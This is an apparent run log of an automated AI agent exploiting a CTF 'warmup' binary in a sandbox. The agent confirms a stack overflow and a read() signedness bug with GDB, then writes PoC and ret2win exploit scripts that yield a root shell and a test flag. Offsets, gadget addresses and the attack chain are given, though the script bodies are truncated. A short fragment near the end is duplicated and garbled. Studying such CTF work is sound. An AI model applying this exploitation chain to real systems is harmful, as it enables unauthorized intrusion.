18:36:14 [impact:BUG-001] **PRIM-003 已验证！** 在 `ret` 指令处单步执行后： - 第一次 `si` 执行了位于 0x401016 的 `ret` gadget（栈对齐） - 第二次 `si` 跳转到了 **0x401182 = get_shell** — RIP 现在位于 get_shell！  这证明了
18:36:14 [impact:BUG-001]   → 工具 delete({"file_path": "/work/workspace/0008-2021-28-warmup-20260905-182730/payload_test.bin"})
18:36:14 [impact:BUG-001]   → 工具 delete({"file_path": "/work/workspace/0008-2021-28-warmup-20260905-182730/payload_test2.bin"})
18:36:14 [impact:BUG-001]   ← delete(0.0s): Deleted /work/workspace/0008-2021-28-warmup-20260905-182730/payload_test.bin
18:36:14 [impact:BUG-001]   ← delete(0.0s): Deleted /work/workspace/0008-2021-28-warmup-20260905-182730/payload_test2.bin
18:36:14 [impact:BUG-001] → 调用 GLM...
18:36:38 [impact:BUG-001] ← GLM(23.6s): 调工具[write_file]
18:36:38 [impact:BUG-001] 现在让我编写最终的 PoC 脚本，生成所有 payload 并记录所有证据：
18:36:38 [impact:BUG-001]   → 工具 write_file({"content": "#!/usr/bin/env python3\n\"\"\"\nPoC for BUG-001: Stack Buffer Overflow in main()\nTarget: /work/workspace/0008-2021-28-warmup-20260905-18)
18:36:38 [impact:BUG-001]   ← write_file(0.0s): Updated file /work/workspace/0008-2021-28-warmup-20260905-182730/poc-BUG-001.py
18:36:38 [impact:BUG-001] → 调用 GLM...
18:36:40 [impact:BUG-001] ← GLM(2.3s): 调工具[run_script]
18:36:40 [impact:BUG-001]   → 工具 run_script({"path": "/work/workspace/0008-2021-28-warmup-20260905-182730/poc-BUG-001.py", "timeout": 10})
18:36:41 [impact:BUG-001]   ← run_script(0.1s): rc=0 ⏎ --- stdout (summarized) --- ⏎ === BUG-001: Stack Buffer Overflow PoC === ⏎ Buffer at rbp-0x70, saved rbp at offset 112, return addr at offset 1...(2427 chars)
18:36:41 [impact:BUG-001] → 调用 GLM...
18:36:42 [impact:BUG-001] ← GLM(1.8s): 调工具[ls]
18:36:42 [impact:BUG-001] 所有 payload 已生成，PoC 脚本运行正常。现在让我确认所有 payload 文件是否存在：
18:36:42 [impact:BUG-001]   → 工具 ls({"path": "/work/workspace/0008-2021-28-warmup-20260905-182730"})
18:36:42 [impact:BUG-001]   ← ls(0.0s): ['/work/workspace/0008-2021-28-warmup-20260905-182730/full_run.log', '/work/workspace/0008-2021-28-warmup-20260905-182730/payload_getshell.bin', '/wor...(706 chars)
18:36:42 [impact:BUG-001] → 调用 GLM...
18:37:57 [impact:BUG-001] ← GLM(74.6s): 调工具[submit_final_result]
18:37:57 [impact:BUG-001] 所有文件均已就绪。现在让我汇总所有证据并提交最终报告。让我总结一下验证结果：  **PRIM-001 (RIP_CONTROL) - 已验证 (VERIFIED)**: - GDB 在 `ret` (0x4012ba) 处：`[rsp]` = 0x4141414141414141 (val1) 和 
18:37:57 [impact:BUG-001] ✓ submit_final_result 收到最终报告（PrimitiveReport 校验通过，16858 chars）
18:37:57 [impact:BUG-001] → 调用 GLM...
18:38:04 [impact:BUG-001] ← GLM(7.0s)
18:38:04 [impact:BUG-001] S3 Primitive 分析与验证已完成。以下是验证结果摘要：  ## BUG-001: Stack Buffer Overflow — Primitive 验证结果  ### PRIM-001: RIP_CONTROL (VERIFIED, DIRECT) - **链条**: `read(0, 
18:38:04 === impact (bug_id=BUG-002) ===
18:38:04 [impact:BUG-002] → 调用 GLM...
18:38:07 [impact:BUG-002] ← GLM(2.6s): 调工具[disassemble, checksec]
18:38:07 [impact:BUG-002] 我将分析 BUG-002（read 返回值符号不匹配导致的 OOB 读取）。让我先检查反汇编代码以了解确切的代码路径。
18:38:07 [impact:BUG-002]   → 工具 disassemble({"binary": "/work/workspace/0008-2021-28-warmup-20260905-182730/target", "function": "main", "lines": 120})
18:38:07 [impact:BUG-002]   → 工具 checksec({"binary": "/work/workspace/0008-2021-28-warmup-20260905-182730/target"})
18:38:07 [impact:BUG-002]   ← disassemble(0.0s): 0000000000401200 <main>: ⏎   401200:	push   rbp ⏎   401201:	mov    rbp,rsp ⏎   401204:	add    rsp,0xffffffffffffff80 ⏎   401208:	mov    QWORD PTR [rbp...(1776 chars)
18:38:07 [impact:BUG-002]   ← checksec(0.4s): [*] '/work/workspace/0008-2021-28-warmup-20260905-182730/target' ⏎     Arch:       amd64-64-little ⏎     RELRO:      Partial RELRO ⏎     Stack:      N...(253 chars)
18:38:07 [impact:BUG-002] → 调用 GLM...
18:38:12 [impact:BUG-002] ← GLM(5.4s): 调工具[probe_io]
18:38:12 [impact:BUG-002] 现在我已经有了完整的反汇编代码。让我来分析一下关键路径：  - `0x401239`: `read(0, rbp-0x70, 0x100)` — 返回值存储在 `[rbp-0x4]` 中 - `0x401244`: `sub eax, 0x1` — 返回值减 1 - `0x401247`: `cdq
18:38:12 [impact:BUG-002]   → 工具 probe_io({"binary": "/work/workspace/0008-2021-28-warmup-20260905-182730/target", "input": "hello", "max_lines": 30})
18:38:12 [impact:BUG-002]   ← probe_io(0.0s): 00000000: 5765 6c63 6f6d 6520 746f 2065 6368 6f20  Welcome to echo  ⏎ 00000010: 7365 7276 6963 652e 0a68 656c 6c6f 456e  service..helloEn ⏎ 00000020: ...(2100 chars)
18:38:12 [impact:BUG-002] → 调用 GLM...
18:38:19 [impact:BUG-002] ← GLM(6.9s): 调工具[gdb_run]
18:38:19 [impact:BUG-002] 我明白了——当 `scanf` 到达 EOF 时，它会返回 0，但不会写入任何内容，因此 `[rbp-0x78]` 会保留其之前的值（'N'），导致循环继续。随后 `read` 返回 0 (EOF)，从而触发了 BUG-002 路径。让我使用 GDB 来验证这一点，并观察当 `read` 返回 0 
18:38:19 [impact:BUG-002]   → 工具 gdb_run({"binary": "/work/workspace/0008-2021-28-warmup-20260905-182730/target", "commands": "b *0x40123e; run; info registers rax; x/1bx $rbp-0x71; echo === )
18:38:19 [impact:BUG-002]   ← gdb_run(0.1s): Breakpoint 1 at 0x40123e ⏎ [Thread debugging using libthread_db enabled] ⏎ Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1". ...(642 chars)
18:38:20 [impact:BUG-002] → 调用 GLM...
18:38:26 [impact:BUG-002] ← GLM(6.0s): 调工具[gdb_run]
18:38:26 [impact:BUG-002] 第一次 `read` 返回 8（"hello\n" = 6 字节 + 可能还有更多）。等等，它返回了 8。让我检查一下——输入是 "hello\nN\n"。第一次 `read` 得到了 "hello\nN\n" = 8 字节。然后 `eax = 8-1 = 7`，`rax = 7`，访问地址 = `
18:38:26 [impact:BUG-002]   → 工具 gdb_run({"binary": "/work/workspace/0008-2021-28-warmup-20260905-182730/target", "commands": "b *0x40123e; ignore 1 1; run; printf \"=== second read return: r)
18:38:26 [impact:BUG-002]   ← gdb_run(0.1s): Breakpoint 1 at 0x40123e ⏎ [Thread debugging using libthread_db enabled] ⏎ Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1". ...(566 chars)
18:38:26 [impact:BUG-002] → 调用 GLM...
18:38:34 [impact:BUG-002] ← GLM(8.0s): 调工具[gdb_run]
18:38:34 [impact:BUG-002] 太棒了！这证实了 BUG-002：  - 第二次 `read` 返回 0 (EOF) - `eax = 0 - 1 = -1`，`cdqe` → `rax = 0xffffffffffffffff` - 访问地址 = `rbp + 0xffffffffffffffff - 0x70` = `rbp 
18:38:34 [impact:BUG-002]   → 工具 gdb_run({"binary": "/work/workspace/0008-2021-28-warmup-20260905-182730/target", "commands": "b *0x40123e; ignore 1 1; run; printf \"=== read returned: rax=%d)
18:38:34 [impact:BUG-002]   ← gdb_run(0.1s): Breakpoint 1 at 0x40123e ⏎ [Thread debugging using libthread_db enabled] ⏎ Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1". ...(727 chars)
18:38:34 [impact:BUG-002] → 调用 GLM...
18:38:43 [impact:BUG-002] ← GLM(9.2s): 调工具[gdb_run]
18:38:43 [impact:BUG-002] 现在我已经很清楚了。让我分析一下内存布局：  - `rbp-0x78` = `0x7fffffffeaf8` → 包含 `0x4e` ('N', 即 `continue_flag`) - `rbp-0x71` = `0x7fffffffeaff` → 访问地址 (缓冲区下方 1 字节处) - `rb
18:38:43 [impact:BUG-002]   → 工具 gdb_run({"binary": "/work/workspace/0008-2021-28-warmup-20260905-182730/target", "commands": "b *0x40123e; run; printf \"=== first read rax=%d ===\\n\", $rax;)
18:38:43 [impact:BUG-002]   ← gdb_run(0.1s): Breakpoint 1 at 0x40123e ⏎ [Thread debugging using libthread_db enabled] ⏎ Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1". ...(826 chars)
18:38:43 [impact:BUG-002] → 调用 GLM...
18:39:21 [impact:BUG-002] ← GLM(37.4s): 调工具[write_file]
18:39:21 [impact:BUG-002] 有趣！第一次 `read` 得到了 "AAAAAAA\n" = 8 字节。`scanf("%7s")` 读取了 "AAAAAAA"（7 字节），但 `scanf` 在遇到空白字符时会停止，所以它并没有消耗掉换行符。等等，实际上——`scanf` 会跳过前导空白字符。让我再仔细看看。  输入是 "AA
18:39:21 [impact:BUG-002]   → 工具 write_file({"content": "#!/usr/bin/env python3\n\"\"\"\nPoC for BUG-002: OOB_READ via read() return value signedness mismatch.\n\nRoot Cause:\n  After read(0, rb)
18:39:21 [impact:BUG-002]   ← write_file(0.0s): Updated file /work/workspace/0008-2021-28-warmup-20260905-182730/poc-BUG-002.py
18:39:21 [impact:BUG-002] → 调用 GLM...
18:39:22 [impact:BUG-002] ← GLM(1.5s): 调工具[run_script]
18:39:22 [impact:BUG-002]   → 工具 run_script({"path": "/work/workspace/0008-2021-28-warmup-20260905-182730/poc-BUG-002.py", "timeout": 30})
18:39:22 [impact:BUG-002]   ← run_script(0.2s): rc=0 ⏎ --- stdout (summarized) --- ⏎ === GDB STDOUT === ⏎ Breakpoint 1 at 0x40123e ⏎ Breakpoint 2 at 0x401249 ⏎  ⏎ === GDB STDERR (filtered) === ⏎ /bi...(369 chars)
18:39:22 [impact:BUG-002] → 调用 GLM...
18:39:37 [impact:BUG-002] ← GLM(14.5s): 调工具[write_file]
18:39:37 [impact:BUG-002] `<<<` here-string 语法在 `/bin/sh` 中不起作用。让我使用一种不同的方法——将输入写入文件并通过管道传输：
18:39:37 [impact:BUG-002]   → 工具 write_file({"content": "#!/usr/bin/env python3\n\"\"\"\nPoC for BUG-002: OOB_READ via read() return value signedness mismatch.\n\nRoot Cause:\n  After read(0, rb)
18:39:37 [impact:BUG-002]   ← write_file(0.0s): Updated file /work/workspace/0008-2021-28-warmup-20260905-182730/poc-BUG-002.py
18:39:37 [impact:BUG-002] → 调用 GLM...
18:39:40 [impact:BUG-002] ← GLM(3.3s): 调工具[run_script]
18:39:40 [impact:BUG-002]   → 工具 run_script({"path": "/work/workspace/0008-2021-28-warmup-20260905-182730/poc-BUG-002.py", "timeout": 30})
18:39:40 [impact:BUG-002]   ← run_script(0.3s): rc=0 ⏎ --- stdout (summarized) --- ⏎ === GDB STDOUT === ⏎ Breakpoint 1 at 0x40123e ⏎ Breakpoint 2 at 0x401249 ⏎ [Thread debugging using libthread_db e...(1104 chars)
18:39:40 [impact:BUG-002] → 调用 GLM...
18:39:51 [impact:BUG-002] ← GLM(11.1s): 调工具[gdb_run]
18:39:51 [impact:BUG-002] PRIM-001 已验证。现在让我检查一下是否可以触发 OOB 写入路径。关键问题是：我们能否让 OOB 地址处的字节等于 `0x0a`？  对于 `read` 返回 0：访问地址是 `rbp-0x71`。该字节由 `scanf` 的 NUL 终止符或初始化设置。它始终为 `0x00`。让我验证一下
18:39:51 [impact:BUG-002]   → 工具 gdb_run({"binary": "/work/workspace/0008-2021-28-warmup-20260905-182730/target", "commands": "b *0x40123e; run; printf \"=== first read rax=%d ===\\n\", $rax;)
18:39:52 [impact:BUG-002]   ← gdb_run(0.1s): Breakpoint 1 at 0x40123e ⏎ [Thread debugging using libthread_db enabled] ⏎ Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1". ...(798 chars)
18:39:52 [impact:BUG-002] → 调用 GLM...
18:40:01 [impact:BUG-002] ← GLM(9.3s): 调工具[gdb_run]
18:40:01 [impact:BUG-002] 我明白了——当输入为 "AAAAA\n" 时，第一次 `read` 返回 6 字节。然后 `scanf` 尝试读取，但 `stdin` 已经处于 EOF 状态，因此 `scanf` 返回 0 且不写入任何内容。`[rbp-0x78]` 保留了其初始值 `0x4e` ('N')。循环继续，第二次 `r
18:40:01 [impact:BUG-002]   → 工具 gdb_run({"binary": "/work/workspace/0008-2021-28-warmup-20260905-182730/target", "commands": "b *0x40123e; run; printf \"=== first read rax=%d ===\\n\", $rax;)
18:40:01 [impact:BUG-002]   ← gdb_run(0.1s): Breakpoint 1 at 0x40123e ⏎ [Thread debugging using libthread_db enabled] ⏎ Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1". ...(798 chars)
18:40:01 [impact:BUG-002] → 调用 GLM...
18:40:22 [impact:BUG-002] ← GLM(21.3s): 调工具[gdb_run]
18:40:22 [impact:BUG-002] 有趣！第一次 `read` 返回 4 字节 ("A\nN\n")。缓冲区包含 `0x41 0x0a 0x4e 0x00...`。换行符在偏移量 1 处被替换为 NUL（因为 `read` 返回 4，`eax = 3`，`buf[3]` 被检查……等等，不对。让我重新检查一下。  `read` 返回 
18:40:22 [impact:BUG-002]   → 工具 gdb_run({"binary": "/work/workspace/0008-2021-28-warmup-20260905-182730/target", "commands": "b *0x40123e; run; printf \"=== first read rax=%d ===\\n\", $rax;)
18:40:22 [impact:BUG-002]   ← gdb_run(0.1s): Breakpoint 1 at 0x40123e ⏎ [Thread debugging using libthread_db enabled] ⏎ Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1". ...(692 chars)
18:40:22 [impact:BUG-002] → 调用 GLM...
18:40:43 [impact:BUG-002] ← GLM(20.4s): 调工具[write_file]
18:40:43 [impact:BUG-002] 第一次 `read` 获取了所有 6 个字节（"A\nN\nN\n"）。`scanf` 获取了 "N"（等等，不对 —— `read` 消耗了所有 6 个字节，所以 `scanf` 得到了 EOF）。但是 `[rbp-0x78]` 保留了 'N'，所以循环继续。第二次 `read` 返回 0 (EO
18:40:43 [impact:BUG-002]   → 工具 write_file({"content": "#!/usr/bin/env python3\n\"\"\"\nPoC for BUG-002: OOB_READ via read() return value signedness mismatch.\n\nTests two scenarios:\n1. PRIM-0)
18:40:43 [impact:BUG-002]   ← write_file(0.0s): Updated file /work/workspace/0008-2021-28-warmup-20260905-182730/poc-BUG-002.py
18:40:43 [impact:BUG-002] → 调用 GLM...
18:40:46 [impact:BUG-002] ← GLM(3.4s): 调工具[run_script]
18:40:46 [impact:BUG-002]   → 工具 run_script({"path": "/work/workspace/0008-2021-28-warmup-20260905-182730/poc-BUG-002.py", "timeout": 30})
18:41:16 [impact:BUG-002]   ← run_script(30.0s): rc=-124 ⏎ --- stdout (summarized) --- ⏎ === Testing PRIM-001: OOB read at EOF === ⏎ [*] After first input, received: b'AEnd?[Y/N] ' ⏎ [TIMEOUT] killed...(211 chars)
18:41:16 [impact:BUG-002] → 调用 GLM...
18:41:36 [impact:BUG-002] ← GLM(19.3s): 调工具[write_file]
18:41:36 [impact:BUG-002] 脚本卡住了，因为 `p.shutdown('send')` 没有完全触发 EOF 路径，或者程序一直在循环。让我修复一下——程序在 EOF 时会无限循环（`read` 返回 0，`scanf` 返回 0，`[rbp-0x78]` 保持为 'N'，循环继续）。我需要使用 GDB 方法来进行验证，而不是
18:41:36 [impact:BUG-002]   → 工具 write_file({"content": "#!/usr/bin/env python3\n\"\"\"\nPoC for BUG-002: OOB_READ via read() return value signedness mismatch.\n\nRoot Cause:\n  In main, after r)
18:41:36 [impact:BUG-002]   ← write_file(0.0s): Updated file /work/workspace/0008-2021-28-warmup-20260905-182730/poc-BUG-002.py
18:41:36 [impact:BUG-002] → 调用 GLM...
18:41:39 [impact:BUG-002] ← GLM(2.8s): 调工具[run_script]
18:41:39 [impact:BUG-002]   → 工具 run_script({"path": "/work/workspace/0008-2021-28-warmup-20260905-182730/poc-BUG-002.py", "timeout": 30})
18:41:39 [impact:BUG-002]   ← run_script(0.4s): rc=0 ⏎ --- stdout (summarized) --- ⏎ === GDB Output === ⏎ Breakpoint 1 at 0x40123e ⏎ Breakpoint 2 at 0x401249 ⏎ [Thread debugging using libthread_db e...(1597 chars)
18:41:39 [impact:BUG-002] → 调用 GLM...
18:41:45 [impact:BUG-002] ← GLM(5.9s): 调工具[gdb_run]
18:41:45 [impact:BUG-002] PoC 运行成功，并提供了明确的证据。现在让我验证一下关于 `rbp-0x71` 始终为 `0x00` 的分析，检查 `scanf` 是否能实际执行并写入数据。让我测试一下 `scanf` 是否能通过交互式 I/O（使用 GDB 的 `run` 配合可控输入）写入 7 个字符：
18:41:45 [impact:BUG-002]   → 工具 gdb_run({"binary": "/work/workspace/0008-2021-28-warmup-20260905-182730/target", "commands": "b *0x40129b; run; printf \"=== before scanf: [rbp-0x78]=0x%02x [)
18:41:45 [impact:BUG-002]   ← gdb_run(0.1s): Breakpoint 1 at 0x40129b ⏎ [Thread debugging using libthread_db enabled] ⏎ Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1". ...(608 chars)
18:41:45 [impact:BUG-002] → 调用 GLM...
18:42:02 [impact:BUG-002] ← GLM(17.1s): 调工具[gdb_run]
18:42:02 [impact:BUG-002] 有趣！`scanf` 没有写入任何内容，因为 `read` 消耗了所有输入。输入 "A\nBBBBBBB\n"（10 字节）被第一次 `read` 全部消耗了。`scanf` 得到了 EOF 并返回 0，没有写入任何内容。`[rbp-0x78]` 保持为 `0x4e`，`[rbp-0x71]` 保持
18:42:02 [impact:BUG-002]   → 工具 gdb_run({"binary": "/work/workspace/0008-2021-28-warmup-20260905-182730/target", "commands": "b *0x40123e; run; printf \"=== read returned rax=%d ===\\n\", $r)
18:42:02 [impact:BUG-002]   ← gdb_run(0.1s): Breakpoint 1 at 0x40123e ⏎ [Thread debugging using libthread_db enabled] ⏎ Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1". ...(692 chars)
18:42:02 [impact:BUG-002] → 调用 GLM...
18:43:21 [impact:BUG-002] ← GLM(78.7s): 调工具[submit_final_result]
18:43:21 [impact:BUG-002] 这证实了之前的发现。现在我已经掌握了所需的所有证据。让我再检查一下 `read` 返回 -1 是否可以通过任何方式触发。让我看看是否有一种方法可以关闭 `stdin` `fd` 并导致 `read` 错误：  实际上，我意识到我还应该检查：如果 `read` 返回一个非常大的负数（不仅仅是 -1）会
18:43:21 [impact:BUG-002] ✓ submit_final_result 收到最终报告（PrimitiveReport 校验通过，18106 chars）
18:43:21 [impact:BUG-002] → 调用 GLM...
18:43:27 [impact:BUG-002] ← GLM(6.6s)
18:43:27 [impact:BUG-002] BUG-002 的 S3 Primitive 分析与验证已完成。提交的 JSON 报告已通过 Schema 校验。  **分析总结：**  BUG-002 是 `read()` 返回值符号不匹配导致的越界访问。核心代码路径： - `read(0, rbp-0x70, 0x100)` 返回值存入 `[
18:43:27 [stage3] 保存 → /work/workspace/0008-2021-28-warmup-20260905-182730/stage3.json
18:43:27 --- S4 Exploit ---
18:43:28 === exploit (bug_id=-) ===
18:43:28 [exploit] → 调用 GLM...
18:43:34 [exploit] ← GLM(5.9s): 调工具[read_file, disassemble]
18:43:34 [exploit] 我将首先分析 S1/S2/S3 报告，然后加载匹配的技能，再编写 exploit。  **S1/S2/S3 总结：** - No PIE, No Canary, NX enabled, Partial RELRO, libc 2.39 - BUG-001: 栈缓冲区溢出 — `read(0, rbp
18:43:34 [exploit]   → 工具 read_file({"file_path": "/work/leanagent/skills/rop-ret2libc/SKILL.md", "limit": 1000})
18:43:34 [exploit]   → 工具 disassemble({"binary": "/work/workspace/0008-2021-28-warmup-20260905-182730/target", "function": "main", "lines": 80})
18:43:34 [exploit]   ← read_file(0.0s):  1  --- ⏎  2  name: rop-ret2libc ⏎  3  description: 栈溢出→RIP Control→ROP链/ret2libc/SROP拿shell。通用方法论。 ⏎  4  --- ⏎  5   ⏎  6  # ROP / ret2libc / SROP ⏎  ...(1300 chars)
18:43:34 [exploit]   ← disassemble(0.0s): 0000000000401200 <main>: ⏎   401200:	push   rbp ⏎   401201:	mov    rbp,rsp ⏎   401204:	add    rsp,0xffffffffffffff80 ⏎   401208:	mov    QWORD PTR [rbp...(1776 chars)
18:43:34 [exploit] → 调用 GLM...
18:43:38 [exploit] ← GLM(4.3s): 调工具[disassemble, find_ret_gadget]
18:43:38 [exploit] 技能已加载。反汇编确认了 S3 分析。现在让我来验证 `get_shell` 函数并找到一个 `ret` gadget 用于栈对齐。
18:43:38 [exploit]   → 工具 disassemble({"binary": "/work/workspace/0008-2021-28-warmup-20260905-182730/target", "function": "get_shell", "lines": 20})
18:43:38 [exploit]   → 工具 find_ret_gadget({"binary": "/work/workspace/0008-2021-28-warmup-20260905-182730/target"})
18:43:38 [exploit]   ← disassemble(0.0s): 0000000000401182 <get_shell>: ⏎   401182:	push   rbp ⏎   401183:	mov    rbp,rsp ⏎   401186:	lea    rdi,[rip+0xe77]        # 402004 <_IO_stdin_used+0x4...(251 chars)
18:43:38 [exploit]   ← find_ret_gadget(0.2s): [{"addr": "0x0000000000401016", "insn": "ret"}]
18:43:38 [exploit] → 调用 GLM...
18:43:48 [exploit] ← GLM(9.4s): 调工具[probe_io]
18:43:48 [exploit] 已确认： - `get_shell` 在 0x401182 处：`push rbp; mov rbp,rsp; lea rdi,[/bin/sh]; call system@plt` — win 函数。 - `ret` gadget 在 0x401016 处，用于栈对齐。  **路线评估：** - 
18:43:48 [exploit]   → 工具 probe_io({"binary": "/work/workspace/0008-2021-28-warmup-20260905-182730/target", "steps": "[{\"recv_until\": \"Welcome to echo service.\", \"send\": \"AAAA\"})
18:43:51 [exploit]   ← probe_io(3.4s): RECV: b'Welcome to echo service.' ⏎ SEND: 'AAAA' ⏎ RECV: b'\nAAAAEnd?[Y/N] ' ⏎ SEND: 'N' ⏎ RECV: b'' ⏎ SEND: 'BBBB' ⏎ RECV: b'BBBBEnd?[Y/N] ' ⏎ SEND: ...(153 chars)
18:43:51 [exploit] → 调用 GLM...
18:44:21 [exploit] ← GLM(30.4s): 调工具[write_file]
18:44:21 [exploit] I/O 时序已确认。回显循环：发送输入 → 获取回显 + "End?[Y/N] " → 发送 Y/N。要触发溢出：发送 136 字节的 payload（read 读取最多 256 字节，精确读取我们发送的内容），然后发送 "Y" 以退出循环并触发 `leave;ret`。  关键细节：`read(0
18:44:21 [exploit]   → 工具 write_file({"content": "#!/usr/bin/env python3\n# S4 Exploit: ret2win via stack buffer overflow (BUG-001)\n# Target: warmup (No PIE, No Canary, NX, Partial RELRO)
18:44:21 [exploit]   ← write_file(0.0s): Updated file /work/workspace/0008-2021-28-warmup-20260905-182730/exploit.py
18:44:21 [exploit] → 调用 GLM...
18:44:24 [exploit] ← GLM(2.7s): 调工具[run_script]
18:44:24 [exploit] 现在让我运行 exploit 来验证它是否有效：
18:44:24 [exploit]   → 工具 run_script({"path": "/work/workspace/0008-2021-28-warmup-20260905-182730/exploit.py", "timeout": 30})
18:44:27 [exploit]   ← run_script(3.3s): rc=0 ⏎ --- stdout (summarized) --- ⏎ --- key evidence --- ⏎     LEANAGENT_SUCCESS ⏎     uid=0(root) gid=0(root) groups=0(root) ⏎ --- rest --- ⏎ [*] ==...(897 chars)
18:44:27 [exploit] → 调用 GLM...
18:44:59 [exploit] ← GLM(31.8s): 调工具[submit_final_result]
18:44:59 [exploit] 漏洞利用在第一次尝试时即成功。证据： - `LEANAGENT_SUCCESS` 已打印 - `uid=0(root) gid=0(root) groups=0(root)` — 已获取 root shell - `test_flag_content_here` — flag 文件内容已读取 - `
18:44:59 [exploit] ✓ submit_final_result 收到最终报告（ExploitReport 校验通过，9270 chars）
18:44:59 [exploit] → 调用 GLM...
18:45:06 [exploit] ← GLM(6.8s)
18:45:06 [exploit] 漏洞利用已成功提交。以下是总结：  ## S4 漏洞利用完成 — EXPLOIT_SUCCESS  **路线：** ret2win（直接跳转至 `get_shell`）  **攻击链：** 1. **设置：** 连接至 echo 服务，接收 banner 2. **内存破坏：** 发送 256 字节
18:45:06 ✅ Exploit 成功（status=COMPLETED, result_status=EXPLOIT_SUCCESS）。
18:45:06 [stage4] 保存 → /work/workspace/0008-2021-28-warmup-20260905-182730/stage4.json
18:45:19 📄 渗透报告：/work/workspace/0008-2021-28-warmup-20260905-182730/report.md
� banner 2. **内存破坏：** 发送 256 字节
18:45:06 ✅ Exploit 成功（status=COMPLETED, result_status=EXPLOIT_SUCCESS）。
=== 主 agent 汇总 ===
分析完成！以下是结果摘要：

## 漏洞分析结果

| 项目 | 结果 |
|------|------|
| **二进制路径** | `/work/ctf/0008-2021-28-warmup/target` |
| **Exploit 是否成功** | ✅ 成功 |
| **Workspace** | `/work/workspace/0008-2021-28-warmup-20260905-182730/` |
| **Exploit 脚本** | `/work/workspace/0008-2021-28-warmup-20260905-182730/exploit.py` |
| **完整报告** | `/work/workspace/0008-2021-28-warmup-20260905-182730/report.md` |

### 总结

对 `/work/ctf/0008-2021-28-warmup/target` 完成了 S1-S4 全流程漏洞分析（侦察 → 语义分析 → 原语验证 → exploit 开发），**exploit 成功**。完整的分析产物（stage1-4.json、exploit.py、report.md、full_run.log）均保存在 workspace 目录下，可进一步查看 `report.md` 获取详细漏洞信息与利用细节。
